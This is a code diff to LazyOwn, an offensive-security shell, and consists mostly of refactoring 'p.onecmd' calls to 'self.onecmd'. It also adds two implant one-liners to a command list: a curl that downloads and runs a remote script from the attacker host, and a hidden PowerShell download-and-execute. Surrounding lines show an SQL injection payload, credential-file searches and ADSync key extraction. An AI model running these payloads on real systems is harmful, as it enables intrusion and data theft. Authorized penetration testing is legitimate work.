@@ -309,7 +309,6 @@ class LazyOwnShell(cmd2.Cmd):
        
         method = getattr(self, method_name, None)
         if callable(method):
-            #self.log_command(cmd_name, cmd_args)
             return method(cmd_args)
         else:
             print_error(f"{YELLOW} Not Found {BLUE}{line}{RESET}")
@@ -4481,6 +4480,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Analizando sessions/hash.txt con Name-the-hash {RESET}")
         self.cmd(f"nth -t '{line}'")
+        self.onecmd("create_session_json")
 
         return
 
@@ -4535,7 +4535,7 @@ class LazyOwnShell(cmd2.Cmd):
                 f"El archivo debe tener este formato usuario:contraseña ej: administrator:passwordadministrator123&!  {line}{RESET}"
             )
             return
-
+        self.onecmd("create_session_json")
         return
 
     def do_createcookie(self, line):
@@ -4908,7 +4908,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         if clipboard_ip and clipboard_ip != self.params['lhost']:
             lhost = clipboard_ip
-            p.onecmd(f"assign lhost {clipboard_ip}")
+            self.onecmd(f"assign lhost {clipboard_ip}")
             self.custom_prompt = getprompt()
     
             print_msg(f"Updated lhost to {clipboard_ip}")        
@@ -5542,6 +5542,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("LIN find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
             ("LIN find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
             ("LIN find .kdb files", "find / -type f -name *.kdb 2>/dev/null"),
+            ("LIN LazyOwn Implant", f"curl http://{lhost}/r -o r && sh r &"),
             ("LIN ls", "ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"),
             ("LIN autorized keys", "cat /etc/passwd | grep -Ev \"^#\" | cut -d: -f6 | xargs -I {} sh -c 'file={}/.ssh/authorized_keys; if [ -f $file ]; then echo -n {} && echo \":\" && cat $file | grep . && echo; fi'"),
             ("LIN Timers", "systemctl list-timers"),
@@ -5647,6 +5648,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN ADSync", "Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync"),
             ("WIN ADSync Property","Get-ItemProperty -Path \"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe\" | Format-list -Property * -Force"),
             ("WIN ADSync Sql",f"sqlcmd -S {subdomain} -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\""),
+            ("WIN LazyOwn Implant", f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\z.ps1`""')
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Google site:linkedin.com/in \"Company Name\"", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
@@ -6320,6 +6322,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(
             f"{YELLOW} Connecting to ssh {line}@{rhost} -i {file} {RED}[;,;] {RESET}"
         )
+        self.onecmd("create_session_json")
         self.cmd(f"ssh {line}@{rhost} -i {file}")
         print_warn("ssh connection closed")
         return
@@ -10656,7 +10659,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("download the sliver client")
         time.sleep(3)
 
-        p.onecmd("download_resources")
+        self.onecmd("download_resources")
 
         print_msg("Choose the client to download:")
         print_msg("1. Windows")
@@ -11319,7 +11322,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         if not is_binary_present("Ivy"):
             print_warn(f"Ivy is not installed. Installing Ivy... to download option {GREEN}50")
-            p.onecmd("download_external")
+            self.onecmd("download_external")
             self.cmd("go get github.com/fatih/color")
             self.cmd("go get github.com/KyleBanks/XOREncryption/Go")
             self.cmd("go build Ivy.go")
@@ -14151,7 +14154,7 @@ class LazyOwnShell(cmd2.Cmd):
             json.dump(data, outfile, indent=4)
         self.cmd(f"cp {new_filename} payload.json")
         print_msg(f"Updated file saved as {new_filename}")
-        p.onecmd("p")
+        self.onecmd("p")
         return
 
     def do_xss(self, line):
@@ -14372,7 +14375,7 @@ class LazyOwnShell(cmd2.Cmd):
         payload_type = input("    [!] Payload target (1: Windows, 2: Linux, 3: Android): ").strip() or '1'
 
         if payload_type == '2': 
-            p.onecmd("createrevshell")
+            self.onecmd("createrevshell")
             lhost = self.params["lhost"]
             if not check_lhost(lhost):
                 return
@@ -14530,7 +14533,7 @@ class LazyOwnShell(cmd2.Cmd):
             return    
         print_msg("Upload completed.")
         if not payload_type == '3':
-            p.onecmd("nc")
+            self.onecmd("nc")
         return
 
     def do_username_anarchy(self, line):
@@ -16348,7 +16351,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_msg("CubeSpraying already installed, skipping setup.")
         print_msg("Choice the usernames diccionary")
-        p.onecmd("smalldic")
+        self.onecmd("smalldic")
         users = get_users_dic()
         password = get_users_dic()
         if not line:
